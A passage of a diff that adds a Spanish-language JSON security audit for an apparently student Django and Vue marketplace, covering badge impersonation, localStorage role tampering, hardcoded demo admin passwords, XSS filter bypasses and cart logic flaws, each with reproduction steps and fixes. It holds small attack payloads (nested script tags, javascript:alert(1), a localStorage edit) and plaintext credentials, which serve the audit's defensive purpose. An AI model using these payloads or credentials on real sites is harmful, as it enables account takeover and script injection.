+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado en los modelos y vistas de products."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "catalog.store.unverified-official-store-badge-impersonation",
+    "title": "Asignacion arbitraria de insignia de Tienda Oficial sin verificacion administrativa (Brand Impersonation)",
+    "description": "En RegisterStoreAPIView cualquier usuario con rol de vendedor puede registrarse como Tienda Oficial enviando un nombre comercial y URL. El endpoint activa inmediatamente profile.is_official_store = True en su UserProfile sin ninguna revision ni aprobacion por parte de los administradores del sistema. Esto permite a cualquier vendedor suplantar marcas comerciales (como Apple, Sony o Falabella) ostentando insignias de autenticidad fraudulentas en el catalogo.",
+    "root_cause": "Asignacion automatica de is_official_store = True en RegisterStoreAPIView.post (apps/accounts/views.py:120-123) sin moderacion ni estado de aprobacion previa.",
+    "intended_behavior": "El registro de una Tienda Oficial debe quedar en estado PENDING y requerir aprobacion explicita de un administrador antes de activar is_official_store = True en el marketplace.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/accounts/views.py",
+        "line": 114,
+        "scope": "RegisterStoreAPIView.post",
+        "description": "Vendedor envia nombre de marca arbitrario a POST /api/v1/auth/register-store/."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/accounts/views.py",
+        "line": 120,
+        "scope": "RegisterStoreAPIView.post",
+        "description": "La vista asigna profile.is_official_store = True sin validar derechos de marca."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/accounts/views.py",
+        "line": 123,
+        "scope": "RegisterStoreAPIView.post",
+        "description": "profile.save() guarda la insignia oficial de forma permanente."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/accounts/views.py",
+        "line": 120,
+        "description": "profile.is_official_store = True otorgado inmediatamente a cualquier vendedor solicitante."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "El usuario debe poseer rol de Vendedor (SELLER)."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un vendedor malicioso se registra como \"Tienda Oficial Samsung Chile\", engañando a los compradores que confian en la insignia de autenticidad del marketplace.",
+      "payloads": [
+        "{\"store_name\": \"Tienda Oficial Samsung Chile\", \"store_url\": \"https://samsung.com\"}"
+      ],
+      "instructions": [
+        "1. Iniciar sesion como vendedor.",
+        "2. Enviar POST a /api/v1/auth/register-store/ con un nombre de marca conocida.",
+        "3. Consultar los productos del vendedor en el catalogo.",
+        "4. Observar que el frontend renderiza la insignia de Tienda Oficial verificada al lado de sus productos."
+      ],
+      "observed_result": "El perfil del vendedor queda marcado como Tienda Oficial autentica sin intervencion de ningun administrador."
+    },
+    "remediation": {
+      "strategy": "Incorporar un campo is_store_approved o flujo de aprobacion administrativa en el modelo UserProfile, activando la insignia publica solo tras revision manual.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/accounts/views.py",
+          "fixed_code": "profile.official_store_name = store_name\nprofile.official_store_url = store_url\nprofile.is_official_store = False # Requiere aprobacion por soporte/admin"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Cualquier usuario con rol de vendedor puede ejecutar la llamada de registro."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Riesgo de fraude de marca hacia los consumidores pero sin compromiso tecnico de la infraestructura."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Constatado en la vista RegisterStoreAPIView y serializador correspondiente."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "frontend.auth.client-side-role-tampering",
+    "title": "Fuga de confianza en cliente: modificacion de roles y permisos mediante localStorage",
+    "description": "En 'frontend/src/stores/auth.js:8, 26-28', el estado reactivo del usuario y su rol ('role') se almacena en 'localStorage' como un objeto JSON simple sin integridad criptografica ni firma del cliente ('localStorage.getItem(\"user\")'). Los getters del store ('isAdmin', 'isSeller') consumen este valor para renderizar opciones privilegiadas del menu (como 'Panel Administrador' o 'Crear Producto') y en los guards del enrutador de Vue. Aunque el backend valida de forma independiente en endpoints protegidos, esta arquitectura expone interfaces administrativas a usuarios no autorizados que modifiquen su localStorage mediante consola.",
+    "root_cause": "Determinacion de autorizacion de UI basada en datos modificables del cliente en localStorage (frontend/src/stores/auth.js:8, 26-28).",
+    "intended_behavior": "El estado de autorizacion debe derivarse exclusivamente de los claims del token JWT validado o mediante consulta al endpoint /auth/me/.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "frontend/src/stores/auth.js",
+        "line": 8,
+        "scope": "useAuthStore",
+        "description": "Se carga el objeto user desde localStorage.getItem('user')."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/src/stores/auth.js",
+        "line": 26,
+        "scope": "isAdmin",
+        "description": "isAdmin evalua user.value?.role === 'ADMIN' permitiendo desbloquear elementos de la interfaz."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/src/stores/auth.js",
+        "line": 26,
+        "description": "const isAdmin = computed(() => user.value?.role === 'ADMIN') lee directamente desde el estado local."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Usuario autenticado como comprador que modifica su clave en localStorage mediante Developer Tools."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Comprador que altera su rol en el navegador para desbloquear funciones de la interfaz.",
+      "payloads": [
+        "localStorage.setItem('user', JSON.stringify({id: 1, role: 'ADMIN'}))"
+      ],
+      "instructions": [
+        "1. Iniciar sesion con cuenta de comprador normal.",
+        "2. En la consola del navegador ejecutar: const u = JSON.parse(localStorage.getItem('user')); u.role = 'ADMIN'; localStorage.setItem('user', JSON.stringify(u));",
+        "3. Recargar la pagina."
+      ],
+      "observed_result": "La barra de navegacion muestra el boton de 'Panel de Administracion' y las rutas /admin son accesibles en el cliente."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "La consola de desarrollador del navegador esta al alcance de cualquier usuario."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Impacto limitado al cliente dado que los endpoints del backend rechazan las peticiones sin permisos."
+      },
+      "overall_severity": "low"
+    },
+    "remediation": {
+      "strategy": "Decodificar los permisos y rol directamente del token JWT o refrescarlos contra /api/v1/auth/me/ al iniciar la aplicacion.",
+      "code_changes": [
+        {
+          "file_name": "frontend/src/stores/auth.js",
+          "fixed_code": "const isAdmin = computed(() => {\n  const token = token.value;\n  if (!token) return false;\n  try {\n    const payload = JSON.parse(atob(token.split('.')[1]));\n    return payload.role === 'ADMIN';\n  } catch { return false; }\n})"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "frontend.auth.hardcoded-admin-credentials-modal",
+    "title": "Credenciales administrativas y de prueba hardcodeadas en interfaz de usuario y bundle de produccion",
+    "description": "En el componente modal de autenticacion 'frontend/src/components/AuthModal.vue', se incluyen botones de acceso rapido para pruebas que contienen contrasenas y correos electronicos en texto plano: 'admin@inacap.cl' / 'Admin1234!', 'seller@inacap.cl' / 'Seller1234!' y 'buyer@inacap.cl' / 'Buyer1234!'. Estas credenciales coinciden exactamente con las sembradas en la base de datos por el script 'seed_ecommerce.py'. Al compilar el frontend con Vite para produccion ('npm run build'), las credenciales quedan incrustadas de forma indeleble en los archivos estaticos Javascript servidos publicamente, otorgando control total a cualquier usuario.",
+    "root_cause": "Hardcoding de credenciales demo en plantilla y logica de componente Vue (frontend/src/components/AuthModal.vue:251-278).",
+    "intended_behavior": "Ninguna credencial de acceso debe incluirse en el codigo fuente de interfaz ni en el bundle compilado de produccion.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "frontend/src/components/AuthModal.vue",
+        "line": 251,
+        "scope": "fillDemoCredentials",
+        "description": "Se definen objetos Javascript con credenciales administrativas y de roles en texto claro."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/src/components/AuthModal.vue",
+        "line": 270,
+        "scope": "template",
+        "description": "Se renderizan botones en el modal que auto-rellenan y exponen las credenciales al usuario visitante."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/src/components/AuthModal.vue",
+        "line": 254,
+        "description": "admin: { email: 'admin@inacap.cl', password: 'Admin1234!' } hardcodeado en el script del componente."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Despliegue del frontend compilado en ambiente productivo sin haber eliminado los botones de prueba."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Cualquier usuario anonimo que visita el sitio web o inspecciona los archivos JavaScript empaquetados.",
+      "payloads": [
+        "Inspeccion del DOM o busqueda de 'Admin1234!' en el codigo fuente."
+      ],
+      "instructions": [
+        "1. Abrir la aplicacion en el navegador.",
+        "2. Abrir el modal de inicio de sesion (AuthModal).",
+        "3. Hacer clic en el boton 'Admin (Demo)' o inspeccionar las funciones del componente."
+      ],
+      "observed_result": "El formulario se autocompleta con 'admin@inacap.cl' y 'Admin1234!', permitiendo iniciar sesion como administrador."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Las credenciales son visibles a simple vista en el modal de login de la aplicacion."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Toma de control administrativa completa de la plataforma y compromiso de la base de datos."
+      },
+      "overall_severity": "high"
+    },
+    "remediation": {
+      "strategy": "Eliminar la seccion de credenciales demo del componente o encapsularla condicionalmente solo para desarrollo local mediante 'import.meta.env.DEV'.",
+      "code_changes": [
+        {
+          "file_name": "frontend/src/components/AuthModal.vue",
+          "fixed_code": "<div v-if=\"isDevEnvironment\" class=\"mt-4 border-t pt-3\">\n  <!-- Botones demo solo visibles en modo local de desarrollo -->\n</div>"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "frontend.cart.negative-quantity-logic-flaw",
+    "title": "Falla de logica de negocio: asignacion de cantidades negativas y corrupcion del carrito de compras",
+    "description": "En el componente del carrito 'frontend/src/components/CartDrawer.vue', el boton de decremento de cantidad (-) invoca 'cartStore.addItem(item.product, -1)' en lugar de llamar al metodo 'updateQuantity'. En el store de Pinia ('frontend/src/stores/cart.js'), 'addItem' suma directamente la cantidad recibida ('existingItem.quantity += quantity') sin verificar si el resultado resultante es menor o igual a cero. Esto permite al usuario decrementar productos hasta 0 o valores negativos (-1, -2), calculando subtotales negativos y enviando cantidades corruptas al endpoint del backend.",
+    "root_cause": "Uso indebido de addItem con incremento negativo sin validacion de cota inferior (frontend/src/components/CartDrawer.vue:125 y frontend/src/stores/cart.js:37-50).",
+    "intended_behavior": "Al decrementar la cantidad a cero, el item debe ser eliminado del carrito; ninguna cantidad en el carrito debe poder ser menor o igual a cero.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "frontend/src/components/CartDrawer.vue",
+        "line": 125,
+        "scope": "CartDrawer.vue#template",
+        "description": "El usuario presiona el boton '-' ejecutando cartStore.addItem(item.product, -1)."
+      },
+      {
+        "kind": "propagation",
+        "file": "frontend/src/stores/cart.js",
+        "line": 45,
+        "scope": "cartStore.addItem",
+        "description": "existingItem.quantity += quantity reduce la cantidad a 0 y luego a numeros negativos."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/src/stores/cart.js",
+        "line": 80,
+        "scope": "cartStore.cartTotal",
+        "description": "Los totales computados multiplican precios por cantidades negativas, permitiendo compras a saldo negativo o cero."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/src/components/CartDrawer.vue",
+        "line": 125,
+        "description": "@click=\"cartStore.addItem(item.product, -1)\" ejecuta decremento sin limite minimo."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Usuario interactuando con el control de disminucion de cantidad en la interfaz del carrito."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Comprador que manipula las cantidades de productos en el carrito para alterar los totales de pago.",
+      "payloads": [
+        "Clic repetitivo en boton '-' de CartDrawer"
+      ],
+      "instructions": [
+        "1. Agregar un producto al carrito de compras.",
+        "2. Abrir el carrito y presionar el boton '-' dos veces consecutivas.",
+        "3. Observar la cantidad mostrada en pantalla y el calculo del total general."
+      ],
+      "observed_result": "La cantidad del producto pasa de 1 a 0 y luego a -1, deduciendo el valor del total del carrito."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Es reproducible directamente desde la interfaz de usuario con controles estandar sin herramientas de hacking."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Corrupcion en el calculo de pedidos, riesgo de compras con importes distorsionados y errores en la pasarela."
+      },
+      "overall_severity": "high"
+    },
+    "remediation": {
+      "strategy": "Cambiar la invocacion en CartDrawer.vue a 'cartStore.updateQuantity(item.product.id, item.quantity - 1)' y agregar comprobacion en el store que elimine el item si quantity <= 0.",
+      "code_changes": [
+        {
+          "file_name": "frontend/src/components/CartDrawer.vue",
+          "fixed_code": "<button @click=\"cartStore.updateQuantity(item.product.id, item.quantity - 1)\" class=\"p-1 text-slate-400 hover:text-slate-600\">-</button>"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "frontend.dom.createobjecturl-memory-leak",
+    "title": "Fuga de memoria en cliente por omision de URL.revokeObjectURL en carga de imagenes",
+    "description": "En 'frontend/src/components/CreateProductModal.vue:102' y 'frontend/src/components/EditProductModal.vue:423', al previsualizar imagenes seleccionadas por el vendedor, el componente genera URLs temporales mediante 'URL.createObjectURL(file)'. Sin embargo, el codigo omite llamar a 'URL.revokeObjectURL(url)' cuando las imagenes se descartan, se reemplazan o el componente se desmonta (onUnmounted). Esto retiene los archivos binarios de las fotos en la memoria del navegador indefinidamente, provocando consumo excesivo de RAM y degradacion de rendimiento en dispositivos moviles o con catalogos extensos.",
+    "root_cause": "Falta de liberacion de objetos URL temporales con revokeObjectURL (frontend/src/components/CreateProductModal.vue:102).",
+    "intended_behavior": "Cada URL generada por createObjectURL debe ser liberada con revokeObjectURL al cambiar de archivo o al cerrar el modal.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "frontend/src/components/CreateProductModal.vue",
+        "line": 98,
+        "scope": "handleImageUpload",
+        "description": "El usuario selecciona multiples imagenes para el producto."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/src/components/CreateProductModal.vue",
+        "line": 102,
+        "scope": "handleImageUpload",
+        "description": "URL.createObjectURL(file) asigna referencias en memoria sin liberacion posterior."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/src/components/CreateProductModal.vue",
+        "line": 102,
+        "description": "imagePreviews.value.push(URL.createObjectURL(file)) sin llamadas correspondientes a revokeObjectURL."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Vendedor seleccionando o cambiando imagenes repetidamente en el formulario de creacion."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Usuario que carga fotografias de alta resolucion repetidas veces en el modal de creacion.",
+      "payloads": [
+        "Seleccion sucesiva de 20 archivos de imagen de 5MB."
+      ],
+      "instructions": [
+        "1. Abrir el modal de crear producto.",
+        "2. Subir 10 fotografias pesadas.",
+        "3. Cerrar el modal y volver a abrirlo repitiendo el proceso 5 veces.",
+        "4. Medir el consumo de memoria en la pestana de Rendimiento de DevTools."
+      ],
+      "observed_result": "El uso de memoria del navegador incrementa continuamente sin ser reclamado por el recolector de basura."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Ocurre en el uso cotidiano de publicacion de inventario por parte de los vendedores."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Degradacion de rendimiento local en el navegador del cliente sin impacto en el servidor."
+      },
+      "overall_severity": "low"
+    },
+    "remediation": {
+      "strategy": "Implementar hook 'onUnmounted' en los modales para iterar sobre las URLs de previsualizacion y ejecutar 'URL.revokeObjectURL(url)'.",
+      "code_changes": [
+        {
+          "file_name": "frontend/src/components/CreateProductModal.vue",
+          "fixed_code": "onUnmounted(() => {\n  imagePreviews.value.forEach(url => URL.revokeObjectURL(url));\n});"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "frontend.pkg.permissive-semver-ranges",
+    "title": "Rangos SemVer permisivos y falta de verificacion de integridad en dependencias de frontend",
+    "description": "En 'frontend/package.json:11-25', todas las dependencias principales ('vue', 'pinia', 'axios', 'vite') estan declaradas con rangos permisivos usando el caracter caret ('^'), por ejemplo: '^3.5.13'. Si se ejecutan instalaciones con 'npm install' sin exigir 'package-lock.json' en pipelines de CI/CD automatizados, cualquier publicacion de una actualizacion menor o parche comprometida en el registro publico de NPM sera instalada e integrada automaticamente en la aplicacion, exponiendola a ataques de cadena de suministro (Supply Chain Attacks).",
+    "root_cause": "Declaracion de dependencias con rangos flexibles '^' sin politica estricta de lockfile o hash pinning (frontend/package.json:11-25).",
+    "intended_behavior": "Los pipelines de despliegue deben usar estrictamente 'npm ci' y congelar versiones fijas o hashes de integridad en dependencias criticas.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "frontend/package.json",
+        "line": 12,
+        "scope": "dependencies",
+        "description": "Se especifican rangos permisivos de dependencias npm con prefijo ^."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/package.json",
+        "line": 17,
+        "scope": "dependencies.vue",
+        "description": "La version de Vue y utilitarios puede flotar a nuevas versiones publicadas en el registro NPM."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/package.json",
+        "line": 17,
+        "description": "\"vue\": \"^3.5.13\" permite descargar cualquier release 3.x.x posterior."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "third_party_dependency",
+        "description": "Publicacion de un paquete comprometido en el registro publico de npm que coincida con el rango SemVer."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Actor malicioso que compromete la cuenta de un mantenedor de un paquete de NPM del ecosistema Vue.",
+      "payloads": [
+        "Publicacion de version 3.5.14 con payload malicioso en registro publico."
+      ],
+      "instructions": [
+        "1. Revisar package.json y comprobar que las versiones tienen prefijo ^.",
+        "2. Ejecutar npm install en un entorno limpio sin package-lock.json.",
+        "3. Observar que se descargan versiones superiores no testeadas."
+      ],
+      "observed_result": "npm descarga la version mas reciente dentro del rango de forma silenciosa."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "low",
+        "reason": "Depende de un incidente de compromiso de la cadena de suministro en el ecosistema NPM."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Posible introduccion de dependencias inestables o codigo no auditado en builds de produccion."
+      },
+      "overall_severity": "low"
+    },
+    "remediation": {
+      "strategy": "Asegurar que los pipelines utilicen estrictamente 'npm ci' con package-lock.json verificado y considerar congelar versiones exactas.",
+      "code_changes": [
+        {
+          "file_name": "frontend/package.json",
+          "fixed_code": "\"dependencies\": {\n  \"vue\": \"3.5.13\",\n  \"pinia\": \"2.3.0\",\n  \"axios\": \"1.7.9\"\n}"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "frontend.security.regex-stateful-lastindex-bypass",
+    "title": "Bypass de validacion de entradas por fuga de estado lastIndex en expresiones regulares globales",
+    "description": "En frontend/src/utils/security.js, las expresiones regulares FORBIDDEN_XSS_REGEX y MALICIOUS_SCRIPT_PATTERNS estan declaradas como constantes a nivel de modulo con los flags globales '/g' y '/gi'. En JavaScript, cuando una RegExp global se evalua mediante el metodo '.test()', el motor actualiza internamente la propiedad 'lastIndex'. Al evaluar entradas identicas o consecutivas que contengan scripts maliciosos, la segunda llamada inicia la busqueda a partir del caracter posterior a la coincidencia previa, devolviendo 'false' (sin coincidencia). Como consecuencia, la funcion de validacion 'isSafeInput' aprueba cadenas maliciosas como seguras de forma alternada.",
+    "root_cause": "Uso de flag '/g' en expresiones regulares de validacion booleana reutilizadas a nivel de modulo (frontend/src/utils/security.js:11-15, 71-76).",
+    "intended_behavior": "Las expresiones de validacion booleana deben carecer del flag '/g' o reiniciar explicitamente 'lastIndex = 0' previo a cada comprobacion.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "frontend/src/utils/security.js",
+        "line": 71,
+        "scope": "isSafeInput",
+        "description": "Se recibe una cadena de entrada suministrada por el usuario para su validacion."
+      },
+      {
+        "kind": "propagation",
+        "file": "frontend/src/utils/security.js",
+        "line": 11,
+        "scope": "FORBIDDEN_XSS_REGEX",
+        "description": "La RegExp global mantiene el estado mutado de lastIndex de la ejecucion anterior."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/src/utils/security.js",
+        "line": 75,
+        "scope": "isSafeInput",
+        "description": "FORBIDDEN_XSS_REGEX.test(input) retorna false para una carga maliciosa, retornando isSafeInput = true (bypass de seguridad)."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/src/utils/security.js",
+        "line": 11,
+        "description": "export const FORBIDDEN_XSS_REGEX = /<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>|javascript:|data:text\\/html/gi; declara flag /gi global."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Envio de campos de texto validados consecutivamente por isSafeInput en formularios reactivos."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Usuario que ingresa cadenas con javascript: o etiquetas script en campos de texto validados por el frontend.",
+      "payloads": [
+        "javascript:alert(1)"
+      ],
+      "instructions": [
+        "1. Ejecutar isSafeInput('javascript:alert(1)') -> retorna false (coincidencia detectada, lastIndex mutado a 11).",
+        "2. Ejecutar nuevamente isSafeInput('javascript:alert(1)') de forma inmediata.",
+        "3. Verificar el valor retornado en la segunda invocacion."
+      ],
+      "observed_result": "La segunda invocacion devuelve true (aprobado), permitiendo el envio del payload malicioso al bypassear la validacion."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "La naturaleza reactiva de Vue provoca multiples llamadas a los validadores durante el tipeo del usuario."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Invalida completamente el mecanismo de defensa perimetral del frontend frente a inyecciones de script y XSS."
+      },
+      "overall_severity": "high"
+    },
+    "remediation": {
+      "strategy": "Remover el flag '/g' de las constantes de expresiones regulares de validacion en security.js.",
+      "code_changes": [
+        {
+          "file_name": "frontend/src/utils/security.js",
+          "fixed_code": "export const FORBIDDEN_XSS_REGEX = /<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>|javascript:|data:text\\/html/i;\nexport const MALICIOUS_SCRIPT_PATTERNS = /<[^>]*>|javascript:|data:|vbscript:|on\\w+\\s*=/i;"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "frontend.security.single-pass-xss-sanitization-bypass",
+    "title": "Evasion de filtro de sanitizacion XSS por reemplazo en una sola pasada en sanitizeInput",
+    "description": "En 'frontend/src/utils/security.js', la funcion 'sanitizeInput' intenta neutralizar ataques XSS ejecutando una unica pasada de reemplazo con expresiones regulares: 'sanitized = sanitized.replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, \"\")'. Esta tecnica de sanitizacion recursiva ingenua es vulnerable a payloads anidados o interpolados (como '<scr<script>ipt>alert(1)</script>'), donde la remocion de la etiqueta interior reconstruye la etiqueta maliciosa exterior al colapsar los caracteres circundantes.",
+    "root_cause": "Sanitizacion mediante expresion regular no recursiva en una sola pasada (frontend/src/utils/security.js:21-27, 53-64).",
+    "intended_behavior": "Para sanitizacion HTML segura se debe utilizar una libreria robusta como DOMPurify o codificar entidades HTML de forma consistente.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "frontend/src/utils/security.js",
+        "line": 53,
+        "scope": "sanitizeInput",
+        "description": "Se recibe una cadena con etiquetas script anidadas."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/src/utils/security.js",
+        "line": 57,
+        "scope": "sanitizeInput",
+        "description": "replace() elimina la etiqueta interna, dejando formada una etiqueta <script> valida en la salida sanitizada."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/src/utils/security.js",
+        "line": 57,
+        "description": "sanitized = sanitized.replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, ''); se ejecuta una sola vez."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Entrada de texto procesada por sanitizeInput que contenga etiquetas anidadas."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Atacante que ingresa etiquetas anidadas para evadir el filtro XSS del cliente.",
+      "payloads": [
+        "<scr<script>ipt>alert(1)</script>"
+      ],
+      "instructions": [
+        "1. Invocar sanitizeInput('<scr<script>ipt>alert(1)</script>').",
+        "2. Inspeccionar la cadena resultante devuelta por la funcion."
+      ],
+      "observed_result": "La cadena devuelta es '<script>alert(1)', conservando la estructura de etiqueta de script."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "La tecnica de evasion de etiquetas anidadas es ampliamente conocida en pruebas de penetracion."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Invalida la promesa de sanitizacion del utilitario de seguridad si el resultado se inyecta en el DOM."
+      },
+      "overall_severity": "medium"
+    },
+    "remediation": {
+      "strategy": "Utilizar la libreria estandar DOMPurify o codificar estrictamente los caracteres especiales HTML (<, >, &, \", ').",
+      "code_changes": [
+        {
+          "file_name": "frontend/src/utils/security.js",
+          "fixed_code": "export const sanitizeInput = (input) => {\n  if (!input || typeof input !== 'string') return '';\n  return input.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\"/g, '&quot;').replace(/'/g, '&#x27;');\n};"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "frontend.store.unvalidated-external-link-phishing",
+    "title": "Enlace externo arbitrario no validado en Tiendas Oficiales (Riesgo de Phishing / Redireccion abierta)",
+    "description": "En 'frontend/src/components/ProductCleanUrlView.vue:254-262', cuando un producto pertenece a una tienda oficial, se renderiza un enlace hacia el sitio web del vendedor: '<a :href=\"store.website\" target=\"_blank\" rel=\"noopener noreferrer\">Visitar Tienda Oficial</a>'. En el backend ('backend/apps/accounts/views.py:113'), el campo 'website' de RegisterStoreAPIView no valida que la URL pertenezca a un protocolo seguro (https://) ni valida el dominio contra listas de dominios permitidos o bloqueados. Un vendedor fraudulento puede registrar URLs engañosas (ej. sitios clonados de bancos o malware) que los compradores visitaran confiando en la insignia de 'Tienda Oficial'.",
+    "root_cause": "Renderizado directo de URL externa no saneada con esquema arbitrario (frontend/src/components/ProductCleanUrlView.vue:254 y backend/apps/accounts/views.py:113).",
+    "intended_behavior": "El campo website debe validar estrictamente que la URL use HTTPS y pasar por una pagina intermedia de advertencia de redireccion externa.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/accounts/views.py",
+        "line": 113,
+        "scope": "RegisterStoreAPIView.post",
+        "description": "Se almacena la URL de website suministrada por el usuario sin validacion estricta."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/src/components/ProductCleanUrlView.vue",
+        "line": 258,
+        "scope": "template",
+        "description": "Se enlaza directamente :href=\"store.website\" en la vista de detalle de producto con insignia oficial."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/src/components/ProductCleanUrlView.vue",
+        "line": 258,
+        "description": "<a :href=\"product.store.website\" target=\"_blank\" rel=\"noopener noreferrer\"> enlaza URL sin verificar protocolo ni dominio."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "user_interaction",
+        "description": "Comprador haciendo clic en el enlace 'Visitar Tienda Oficial' en la pagina del producto."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Vendedor malicioso que registra una tienda oficial con website apuntando a un portal de phishing.",
+      "payloads": [
+        "https://phishing-banco-clonado.example.com"
+      ],
+      "instructions": [
+        "1. Registrar una tienda oficial con website 'https://phishing-banco-clonado.example.com'.",
+        "2. Publicar un producto.",
+        "3. Abrir la vista del producto como comprador y presionar 'Visitar Tienda Oficial'."
+      ],
+      "observed_result": "El navegador abre directamente el sitio malicioso en una nueva pestana bajo la apariencia de respaldo de la plataforma."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Cualquier usuario con rol de vendedor puede registrar una tienda y configurar el sitio web."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Fraude financiero, robo de credenciales mediante phishing a los clientes del marketplace."
+      },
+      "overall_severity": "medium"
+    },
+    "remediation": {
+      "strategy": "Validar en backend que website comience estrictamente con 'https://' y agregar advertencia de salida en frontend.",
+      "code_changes": [
+        {
+          "file_name": "frontend/src/components/ProductCleanUrlView.vue",
+          "fixed_code": "<a :href=\"safeStoreWebsite\" @click=\"confirmExternalRedirect($event, product.store.website)\" target=\"_blank\" rel=\"noopener noreferrer\">"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "infra.docker.insecure-django-runserver-production",
